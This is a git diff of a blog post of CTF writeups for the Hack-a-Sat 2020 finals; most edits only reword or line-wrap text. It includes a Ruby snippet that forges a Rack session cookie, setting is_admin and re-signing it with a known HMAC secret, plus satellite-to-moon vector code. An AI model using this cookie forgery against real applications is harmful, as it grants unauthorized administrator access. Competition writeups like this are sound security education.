@@ -8,7 +8,7 @@ tags: [ctf, satellites, space, reversing, protocols]
 
 # Hack-a-Sat Finals
 
-These are our writeups for the finals of the [Hack-a-Sat 2020](https://ctftime.org/event/1104) competition, which took place in early August of this year. The competition was very novel, with a cool physical device given to each team and a very interesting platform to do CTF hacking on. We were thrilled to take part and are looking forward to future iterations of the event. Finalist teams each had to submit writeups for challenges they solved, which we've posted below.
+These are our writeups for the finals of the [Hack-a-Sat 2020](https://ctftime.org/event/1104) CTF, which took place in early August of this year. The competition was very exciting and novel, with a cool physical flat-sat device given to each team and a very interesting COSMOS-based setup to do CTF hacking on. We were thrilled to take part in the event and are looking forward to future iterations. Finalist teams each had to submit writeups for challenges they solved, which we've posted below.
 
 ## Challenge 0 (web/pentest)
 
@@ -22,7 +22,14 @@ require 'openssl'
 require 'cgi'
  
 myval = Rack::Session::Cookie::Base64::Marshal.new
-session_data = ("BAh7CEkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkU1ZWViNmU5M2UzNTc0ODMxMDhjZGUxOTJmNDUyOThiMmM1OGZmODI5Y2I1ZmQwNDRiNmQzMjc3ZDE0NzM5MGMzBjsARkkiCWNzcmYGOwBGSSIxK2NydGtMak5NU09iUE95akdYVWJiVGl0SjN5djFFOU5pNGlxaUsycnNwbz0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItZDc5NTgyZGVhMDM0MTA0YTM1MmJkOTAzYmU3MGQ5YmM2ODM0YWZhZAY7AEY=--2c061beaf41b799f21c4fe2bf4539488a0b8bb33")
+session_data = ("BAh7CEkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246"\
+"OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkU1ZWViNmU5M2UzNTc0OD"\
+"MxMDhjZGUxOTJmNDUyOThiMmM1OGZmODI5Y2I1ZmQwNDRiNmQzMjc3"\
+"ZDE0NzM5MGMzBjsARkkiCWNzcmYGOwBGSSIxK2NydGtMak5NU09iU"\
+"E95akdYVWJiVGl0SjN5djFFOU5pNGlxaUsycnNwbz0GOwBGSSINdHJ"\
+"hY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItZDc5N"\
+"TgyZGVhMDM0MTA0YTM1MmJkOTAzYmU3MGQ5YmM2ODM0YWZhZAY7AEY"\
+"=--2c061beaf41b799f21c4fe2bf4539488a0b8bb33")
 session_data, _, digest = session_data.rpartition('--')
 session_data = myval.decode(session_data)
  
@@ -31,7 +38,10 @@ session_data["is_admin"] = true
  
 session_data = myval.encode(session_data)
  
-session_data + "--#{OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, "bbtZJIIecRdlyIpD49A9VHywZgqwtycAr", session_data)}"
+session_data + "--#{OpenSSL::HMAC.hexdigest(
+                    OpenSSL::Digest::SHA1.new,
+                    "bbtZJIIecRdlyIpD49A9VHywZgqwtycAr",
+                    session_data)}"
 ```
 
 The basic idea here is that the secret value is used as the key for the HMAC protecting the cookie. The cookie itself is a base64’d Ruby hash containing user information and a CSRF token.
@@ -130,9 +140,15 @@ Ultimately, we ended up getting within the error window by changing the moon cal
 
 ```python3=
 # Boresight vector
-imaging_camera = np.array([0.0071960999264690, -0.999687104708689, -0.023956394240496])
+imaging_camera = np.array([
+                    0.0071960999264690,
+                    -0.999687104708689,
+                    -0.023956394240496
+                    ])
 # Our original attempt to calculate the satellite <-> moon vector
-moonvec = (np.array(earth.at(t).observe(planets['moon']).apparent().ecliptic_xyz().km ) - ( satellite.at(t).ecliptic_xyz().km ))
+moonvec = (np.array(earth.at(t).observe(planets['moon']).
+    apparent().ecliptic_xyz().km ) -
+    ( satellite.at(t).ecliptic_xyz().km ))
  
 # Our updated attempt which used skyfield’s code in a more direct fashion
 moonvec = np.array(satellite.at(t).observe(moon).position.km)
